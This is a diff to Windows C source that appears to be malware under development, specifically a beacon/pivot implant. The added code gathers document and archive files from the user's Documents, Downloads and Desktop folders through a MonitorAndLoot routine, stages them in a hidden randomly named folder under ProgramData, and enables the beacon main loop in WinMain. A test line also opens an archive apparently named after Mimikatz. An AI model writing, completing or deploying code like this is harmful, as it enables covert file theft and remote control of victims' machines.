@@ -2665,8 +2665,8 @@ void test152(void) {
 	DWORD dwNumberOfItems = 0;
 	WCHAR wszPath[] = L"D:\\App\\Dev Tools\\drltrace\\drltrace_src\\dynamorio\\clients\\drcachesim\\tests\\drmemtrace.threadsig.x64.tracedir\\drmemtrace.threadsig.10506.7343.trace.gz";
 
-	ItemList = ExtractFromZip(wszPath, NULL, TRUE, &dwNumberOfItems);
-	//ItemList = ExtractFromZip(L"C:\\Users\\Admin\\Desktop\\detai.rar", NULL, TRUE, &dwNumberOfItems);
+	//ItemList = ExtractFromZip(wszPath, NULL, TRUE, &dwNumberOfItems);
+	ItemList = ExtractFromZip(L"C:\\Users\\Admin\\Desktop\\Mimi.7z", NULL, TRUE, &dwNumberOfItems);
 }
 
 void test153(void) {
@@ -2823,6 +2823,7 @@ VOID Final(VOID)
 	LPWSTR lpTemp = NULL;
 	LPWSTR DocumentExtensions[] = { L".doc", L".docm", L".docx", L".pdf", L".ppsm", L".ppsx", L".ppt", L".pptm", L".pptx", L".pst", L".rtf", L".xlm", L".xls", L".xlsm", L".xlsx", L".odt", L".ods", L".odp", L".odg", L".odf" };
 	LPWSTR ArchiveExtensions[] = { L".rar", L".zip", L".tar", L".gz", L".xz", L".sz", L".7z" };
+	WCHAR wszUserProfile[MAX_PATH];
 	DWORD i = 0;
 
 #ifndef _DEBUG
@@ -2862,6 +2863,22 @@ VOID Final(VOID)
 	}
 
 	ExpandEnvironmentStringsW(L"%ALLUSERSPROFILE%", pGlobalConfig->wszWarehouse, _countof(pGlobalConfig->wszWarehouse));
+	ExpandEnvironmentStringsW(L"%USERPROFILE%", wszUserProfile, _countof(wszUserProfile));
+	pGlobalConfig->dwNumberOfMonitoredFolder = 3;
+	pGlobalConfig->MonitoredFolder = ALLOC(sizeof(LPWSTR) * pGlobalConfig->dwNumberOfMonitoredFolder);
+	for (i = 0; i < pGlobalConfig->dwNumberOfMonitoredFolder - 1; i++) {
+		pGlobalConfig->MonitoredFolder[i] = DuplicateStrW(wszUserProfile, 0x20);
+	}
+
+	lstrcatW(pGlobalConfig->MonitoredFolder[0], L"\\Documents");
+	lstrcatW(pGlobalConfig->MonitoredFolder[1], L"\\Downloads");
+	pGlobalConfig->MonitoredFolder[2] = ALLOC(sizeof(WCHAR) * MAX_PATH);
+	if (!SHGetSpecialFolderPathW(NULL, pGlobalConfig->MonitoredFolder[2], CSIDL_DESKTOP, FALSE)) {
+		FREE(pGlobalConfig->MonitoredFolder[2]);
+		pGlobalConfig->dwNumberOfMonitoredFolder--;
+		pGlobalConfig->MonitoredFolder[2] = NULL;
+	}
+
 	lpTemp = GenRandomStrW(8);
 	lstrcatW(pGlobalConfig->wszWarehouse, L"\\");
 	lstrcatW(pGlobalConfig->wszWarehouse, lpTemp);
@@ -2876,6 +2893,11 @@ VOID Final(VOID)
 	}
 #endif
 
+	if (pGlobalConfig->Loot) {
+		MonitorAndLoot(pGlobalConfig);
+	}
+	
+	Sleep(1000000000);
 	if (pGlobalConfig->Type == Beacon || pGlobalConfig->Type == Pivot) {
 		pBeaconClient = BeaconInit(pGlobalConfig);
 		BeaconMainLoop(pBeaconClient);
@@ -3187,10 +3209,10 @@ int WinMain
 	//test150();
 	//test151();
 	//test152();
-	test153();
+	//test153();
 	//test154();
 	//test155();
-	//Final();
+	Final();
 	//WaitForSingleObject(hThread, INFINITE);
 CLEANUP:
 	if (hThread != NULL) {
